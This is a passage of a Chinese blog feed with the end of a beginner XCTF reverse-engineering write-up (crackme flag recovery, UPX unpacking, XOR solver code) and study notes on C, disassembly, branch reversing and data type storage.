id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733881777919.jpg" srcset="/img/loading.gif" alt="-w602"><br>进入main函数，F5大法查看伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733882559724.jpg" srcset="/img/loading.gif" alt="-w511"><br>发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887654757.jpg" srcset="/img/loading.gif" alt="-w379"><br>点击进去看到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887851687.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733888354402.jpg" srcset="/img/loading.gif" alt="-w632"><br>那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10）</p><p>接下来就是v10与v13进行对比，v13是刚刚复制过来的<code>437261636b4d654a757374466f7246756e</code>，那就可以看出来咱们直接把这个进行16进制转回去就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733891570437.jpg" srcset="/img/loading.gif" alt="-w526"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这道题是拿到了一段c源码，打开发现关键处：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897127019.jpg" srcset="/img/loading.gif" alt="-w1023"><br>可以看出来把<code>first second strlen(argv[3])</code>搞清楚是什么就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897938110.jpg" srcset="/img/loading.gif" alt="-w590"><br>很简单可以看出这3个是什么值，下面直接放解密代码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) {    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre><p>拿到flag：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733900988974.jpg" srcset="/img/loading.gif" alt="-w603"></p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910805939.jpg" srcset="/img/loading.gif" alt="-w685"></p><p>单步调试走一会，在寄存器窗口看到：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910639998.jpg" srcset="/img/loading.gif" alt="-w1019"><br>这很明显是加了UPX壳。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733911418603.jpg" srcset="/img/loading.gif" alt="-w733"><br>这里就用<code>upx -d</code>直接一键脱壳。以后可以练习手动脱upx壳。<br>脱壳完成后用IDA进行分析：</p><h3 id="IDA静态分析-1"><a href="#IDA静态分析-1" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733913704154.jpg" srcset="/img/loading.gif" alt="-w617"><br>打开直接出现了flag，这个题就考个识别壳和upx脱壳了。</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741646328276.jpg" srcset="/img/loading.gif" alt="-w569"><br>先查看一下，无壳，elf 64位应用。</p><h3 id="IDA静态分析-2"><a href="#IDA静态分析-2" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741650120350.jpg" srcset="/img/loading.gif" alt="-w442"><br>点击此处出现了：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741650432513.jpg" srcset="/img/loading.gif" alt="-w493"><br>确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741657131708.jpg" srcset="/img/loading.gif" alt="-w1026"><br>这里面难点就在如何对v8的理解。</p><h3 id="v8与关键加密分析"><a href="#v8与关键加密分析" class="headerlink" title="v8与关键加密分析"></a>v8与关键加密分析</h3><p>v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。<img src="/2019/11/09/Xctfre_新手区wp/images/15741666120370.jpg" srcset="/img/loading.gif" alt="-w496"><br>刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是<img src="/2019/11/09/Xctfre_新手区wp/images/15741662400799.jpg" srcset="/img/loading.gif" alt="-w226"><br>正好是反过来的。<br>然后分析一下加密代码，这主要就是指针知识了：<br><code>v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);</code><br>这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。<code>i % v7</code>其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    int v6;    char v7[]=&quot;harambe&quot;;    v6 = 7;    char v8[18];    strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);    char s[18];    int i;    for ( i = 0; i &lt; strlen(v8); ++i) {        s[i] =v7[i%v6]^v8[i];    }    for (int j = 0; j &lt; strlen(v8); ++j) {        printf(&quot;%c&quot;,s[j]);    }    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741669073968.jpg" srcset="/img/loading.gif" alt="-w402"></p><h3 id="对于大小端序的知识补充"><a href="#对于大小端序的知识补充" class="headerlink" title="对于大小端序的知识补充"></a>对于大小端序的知识补充</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741673443772.jpg" srcset="/img/loading.gif" alt="-w718"><br>数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。<strong>但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。</strong></p><p><strong>强调</strong>：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。</p><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741680757822.jpg" srcset="/img/loading.gif" alt="-w764"><br>这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。</p><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（四）</title>
    <link href="/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（四）"><a href="#C语言与反汇编学习（四）" class="headerlink" title="C语言与反汇编学习（四）"></a>C语言与反汇编学习（四）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习以下内容</p><ol><li>内存图</li><li>全局变量、局部变量</li><li>函数参数的分析</li><li>分支语句:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else</code>分支语句的嵌套使用``的正向与逆向分析</li></ol><h2 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h2><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15718432593875.jpg" srcset="/img/loading.gif" alt="-w301"><br>在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。</p><h2 id="全局变量、局部变量"><a href="#全局变量、局部变量" class="headerlink" title="全局变量、局部变量"></a>全局变量、局部变量</h2><pre><code>int g_n = 10; //全局变量int Funcation() //代码区，调用时执行{    int x = 1;//局部变量    int y = 3;    return g_n+x+y;    }}</code></pre><p>就用这个代码段来分析。</p><h3 id="全局变量的特点"><a href="#全局变量的特点" class="headerlink" title="全局变量的特点"></a>全局变量的特点</h3><p>1、全局变量在程序编译完成后地址就已经确定下来了，<strong>只要程序启动，全局变量就已经存在了</strong>，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。<br>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.<br>3、全局变量所占内存会一直存在，知道整个进程结束.<br>4、全局变量的反汇编识别：<code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code><br>通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.<strong>全局变量就是所谓的基址</strong>。</p><h3 id="局部变量的特点"><a href="#局部变量的特点" class="headerlink" title="局部变量的特点"></a>局部变量的特点</h3><p>1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）<br>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.<br>3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.<br>4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）<br>5、局部变量的反汇编识别：<code>[ebp-4]</code>[ebp-8]<code>[ebp-0xC]</code>等等类似的情形。</p><h2 id="函数参数的分析"><a href="#函数参数的分析" class="headerlink" title="函数参数的分析"></a>函数参数的分析</h2><p>如何判断函数有几个参数，已经分别是什么？</p><p>一般情况：<br>    步骤一：观察调用处的代码<br>    push    3<br>    push    2<br>    push    1<br>    call    0040100f</p><p>步骤二：找到平衡堆栈的代码继续论证</p><pre><code>call    0040100fadd     esp,0Ch</code></pre><p>或者函数内部</p><pre><code>ret 4/8/0xC/0x10</code></pre><p>最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。</p><p>但剩下的百分之二十呢？<br>上面的分析存在的问题：<br>1、<strong>参数传递未必都是通过堆栈，还可能通过使用寄存器</strong>.<br>例：</p><pre><code>push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址</code></pre><p>2、<strong>函数调用处的代码无法查看.</strong><br>例：<br>进入函数查看汇编代码：</p><pre><code>00401050   push         ebp00401051   mov         ebp,esp00401053   sub         esp,48h00401056   push        ebx00401057   push        esi00401058   push        edi    00401059   push        ecx    0040105A   lea         edi,[ebp-48h]0040105D   mov         ecx,12h00401062   mov         eax,0CCCCCCCCh00401067   rep stos    dword ptr [edi]00401069   pop         ecx    0040106A   mov         dword ptr [ebp-8],edx0040106D   mov         dword ptr [ebp-4],ecx00401070   mov         eax,dword ptr [ebp-4]00401073   add         eax,dword ptr [ebp-8]00401076   add         eax,dword ptr [ebp+8]00401079   mov         [g_x (00427958)],eax0040107E   pop         edi    0040107F   pop         esi    00401080   pop         ebx    00401081   mov         esp,ebp00401083   pop         ebp    00401084   ret         4        </code></pre><p>观察步骤：<br>1、不考虑ebp、esp<br>2、只找给别人赋值的寄存器<br>eax/ecx/edx/ebx/esi/edi<br>3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.<br>**公式一：寄存器 + ret 4\8\0C = 参数个数<br>公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数**<br>这两个公式可以互相结合验证看是否算的对。<br>如以上代码段，只可以找到<code>edi,ecx,edx</code>给别人赋值，但是其中<code>edi ecx</code>都是函数内存赋的值，所以只剩下<code>edx</code>，在加上最后的<code>ret 4</code>（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，<code>[ebp+0x]</code>类似的只出现一个.</p><h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><h3 id="正向代码练习"><a href="#正向代码练习" class="headerlink" title="正向代码练习"></a>正向代码练习</h3><p> 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。<br>    #include “stdafx.h”<br>    int g_x = 5;<br>    int g_y = 3;<br>    int g_z = 7;<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(g_x&gt;g_y)<br>        {<br>            if (g_x&gt;g_z)<br>            {<br>                g_r=g_x;<br>            }<br>            else{<br>                    g_r=g_z;<br>                }<br>        }<br>        else if (g_y &gt; g_z)<br>        {<br>            g_r=g_y;<br>        }<br>        else g_r=g_z;<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><p>练习2:找出数组里面最大的值，并存储到全局变量中<br>    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719199995620.jpg" srcset="/img/loading.gif" alt="-w238"><br>    #include “stdafx.h”<br>    int a[4] = {2,5,7,9};<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(a[0]&gt;a[1])<br>        {<br>            if (a[0]&gt;a[2])<br>            {<br>                if (a[0]&gt;a[3])<br>                {<br>                    g_r=a[0];<br>                }<br>                else g_r=a[3];<br>            }<br>            else if(a[2]&gt;a[3]){<br>                    g_r=a[2];<br>                }<br>                else g_r=a[3];<br>        }<br>        else if (a[1] &gt; a[2])<br>        {<br>            if (a[1]&gt;a[3])<br>            {<br>                g_r=a[1];<br>            }<br>            else g_r=a[3];<br>        }<br>        else if (a[2] &gt; a[3])<br>        {<br>            g_r=a[2];<br>        }<br>        else g_r=a[3];<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><h4 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h4><p>1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。<br>2：一个if只对应于一个else，else只能在if后出现与其搭配使用。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="IF语句逆向分析"><a href="#IF语句逆向分析" class="headerlink" title="IF语句逆向分析"></a>IF语句逆向分析</h4><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（<strong>我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。</strong>）<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719206938300.jpg" srcset="/img/loading.gif" alt="-w262"><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719208117580.jpg" srcset="/img/loading.gif" alt="-w331"><br>对于这段代码我们采取一定的分析顺序来分析：</p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   无</li><li>分析全局变量       <code>mov  dword ptr 004225c4,ecx</code></li><li>功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中</li><li>返回值分析   无</li></ol><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719212740917.jpg" srcset="/img/loading.gif" alt="-w367"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：a</code></li><li>分析全局变量       <code>mov         eax,[004225c4]: m</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>逆为c函数</strong>：</p><pre><code>int m=1;void Funcation(int x, int y){    int a;    a=m;    if(x&lt;=y)    {        y=y+a;        m=y;    }}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719214461732.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE…语句逆向分析"><a href="#IF…ELSE…语句逆向分析" class="headerlink" title="IF…ELSE…语句逆向分析"></a>IF…ELSE…语句逆向分析</h4><p>if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719216273356.jpg" srcset="/img/loading.gif" alt="-w226"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码<br><strong>总结：跳转执行一部分代码，不跳转执行另外一部分代码</strong><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719219621907.jpg" srcset="/img/loading.gif" alt="-w369"><br>同样安装一定的顺序：</p><p>1：分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2：分析局部变量   <code>[ebp-4] = eax = [004225c4]</code><br>3：分析全局变量       <code>[004225c4] G</code><br>4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249677324.jpg" srcset="/img/loading.gif" alt="-w427"><br>如果X&gt;Y 那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249899962.jpg" srcset="/img/loading.gif" alt="-w435"><br>5：返回值分析   无<br><strong>练习：</strong><br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719223446828.jpg" srcset="/img/loading.gif" alt="-w382"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：eax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>分析全局变量       <code>mov         eax,[004225c4]</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>还原成c函数：</strong></p><pre><code>int m=1;void Funcation(int x,int y){    int a,b;    a=m;    b=2;    if (x&gt;=y)    {        b=b+1;        if (x&lt;y)        {            m=b;        }else m=a+b;    }}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719224472672.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE-IF…ELSE逆向分析"><a href="#IF…ELSE-IF…ELSE逆向分析" class="headerlink" title="IF…ELSE IF…ELSE逆向分析"></a>IF…ELSE IF…ELSE逆向分析</h4><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719225611187.jpg" srcset="/img/loading.gif" alt="-w307"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，<strong>所有jmp的目标地址一致</strong>。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。<br><strong>如果某个分支没有条件判断，则为else部分</strong>。<br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719226993158.jpg" srcset="/img/loading.gif" alt="-w334"><br>    函数内部功能分析：<br>    1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2</code><br>    3、分析全局变量        无<br>    4、功能分析        </p><pre><code>if(x&gt;y)                                {                                    A = B+1;                                }                                else if(x&gt;z)                                {                                    A = C+1;                                }                                else if(x&gt;z)                                {                                    A = B+C                                }                                else                                {                                    A = B+C+1;                                }                                return A;                </code></pre><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719228667624.jpg" srcset="/img/loading.gif" alt="-w305"><br>1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3、分析全局变量        无<br>    4.返回值分析 a+1<br>    还原成C函数：</p><pre><code>int Funcation(int x,int y,int z){    int a=0;    int b=1;    int c=2;    if (x&lt;=y)    {        a=b-1;    }    else if (y&gt;=z)    {        a=c+1;    }    else if (x&gt;z)    {        a=b+c;    }    else a=b+c-1;    return a+1;}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719229837839.jpg" srcset="/img/loading.gif" alt></p><h4 id="感悟-1"><a href="#感悟-1" class="headerlink" title="感悟"></a>感悟</h4><p>每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（三）</title>
    <link href="/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（三）"><a href="#C语言与反汇编学习（三）" class="headerlink" title="C语言与反汇编学习（三）"></a>C语言与反汇编学习（三）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下C语言的数据类型与数据存储。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715865045834.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="学习数据类型的三个要素"><a href="#学习数据类型的三个要素" class="headerlink" title="学习数据类型的三个要素"></a>学习数据类型的三个要素</h3><p>1、存储数据的宽度<br>2、存储数据的格式<br>3、作用范围(作用域)<br>这些都是谈起一个数据类型的基本要素。</p><h3 id="整数类型：char-short-int-long"><a href="#整数类型：char-short-int-long" class="headerlink" title="整数类型：char  short  int long"></a>整数类型：char  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1字节</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2字节</td></tr><tr><td>int</td><td>32BIT</td><td>4字节</td></tr><tr><td>long</td><td>32BIT</td><td>4字节</td></tr></tbody></table><pre><code>char i = 0xFF;short x =0xFF;long y =0xFF;</code></pre><p>我们来看下在汇编其是什么样的：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715872059570.jpg" srcset="/img/loading.gif" alt="-w505"><br>注意<code>byte word dword</code>的区别。<br>然后我们测试一下以下代码：</p><pre><code>char i = 0x12345678;short x = 0x12345678;long y = 0x12345678;</code></pre><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716535773728.jpg" srcset="/img/loading.gif" alt="-w639"><br>然后看到还是<code>byte word dword</code>，并且也没有报错，但是我们运行以后可以看到<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716536656301.jpg" srcset="/img/loading.gif" alt="-w1106"><br><strong>这就说明你写了32位的数给<code>char i</code>这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。</strong></p><p>整数类型分为有符号(signed)和无符号(unsigned)两种：</p><pre><code>char i = 0xFF;unsigned char i = 0xFF;</code></pre><p>要知道其在内存里存着显示的都是FF<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716703064593.jpg" srcset="/img/loading.gif" alt="-w178"><br>但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在<strong>类型转换和大小比较中特别注意</strong>。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，<strong>会把其会把汇编代码跳转那里改成特定对应的JCC代码</strong>（只要针对无符号，因为默认是有符号的）。<br>例子：<br>无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716712689830.jpg" srcset="/img/loading.gif" alt="-w533"><br>总结：1：在内存中存储的方式完全一样 。<br>        2：在类型转换和大小比较中特别注意（运算）。</p><h3 id="浮点类型：float-double"><a href="#浮点类型：float-double" class="headerlink" title="浮点类型：float double"></a>浮点类型：float double</h3><p>float和double在存储方式上都是遵从IEEE的规范的<br>float的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716717408638.jpg" srcset="/img/loading.gif" alt="-w619"><br>double的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716718171405.jpg" srcset="/img/loading.gif" alt="-w729"></p><h4 id="将一个float型转化为内存存储格式的步骤为"><a href="#将一个float型转化为内存存储格式的步骤为" class="headerlink" title="将一个float型转化为内存存储格式的步骤为:"></a>将一个float型转化为内存存储格式的步骤为:</h4><ol><li>先将这个实数的绝对值化为二进制格式</li><li>将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。</li><li>从小数点右边第一一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入“0”，否则放入“1”。</li><li>如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。</li><li>如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。</li><li>如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。</li></ol><p>这是官方解释。有点麻烦。先练习一个：<br>8.25转成浮点存储<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720748599.jpg" srcset="/img/loading.gif" alt="-w271"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720864148.jpg" srcset="/img/loading.gif" alt="-w229"><br>所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3<br>小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716722496131.jpg" srcset="/img/loading.gif" alt="-w409"><br>按四位分割<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000，然后就这样的形式存入计算机内存。</p><p>我下面用简单的且是正确的办法来转换：<br>将float类型的12.5 转换成16进制：<br>先整理正数部分，12=C=1100<br>小数部分 0.5 * 2=1.0<br>所以二进制就是1100.1，科学计数法 1.1001x2^3<br>这次对中间格子是直接用<code>127+x的结果</code> 变成二进制填充这个格子，x的值就是指数，其中<strong>左移是正右移为负</strong><br> <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716732149036.jpg" srcset="/img/loading.gif" alt="-w382"></p><h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。</p><p>double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩<br>余42位用于表示位数。<br>在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，<strong>加1023后可用于指数符号判断</strong>。</p><p>double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程<br>来转换double类型。<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717429314228.jpg" srcset="/img/loading.gif" alt="-w756"></p><h3 id="英文字符存储"><a href="#英文字符存储" class="headerlink" title="英文字符存储"></a>英文字符存储</h3><p>char x = ‘A’;<br>对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434285598.jpg" srcset="/img/loading.gif" alt="-w446"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434479758.jpg" srcset="/img/loading.gif" alt="-w420"><br>补充：</p><ul><li>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</li><li>ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。</li><li>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 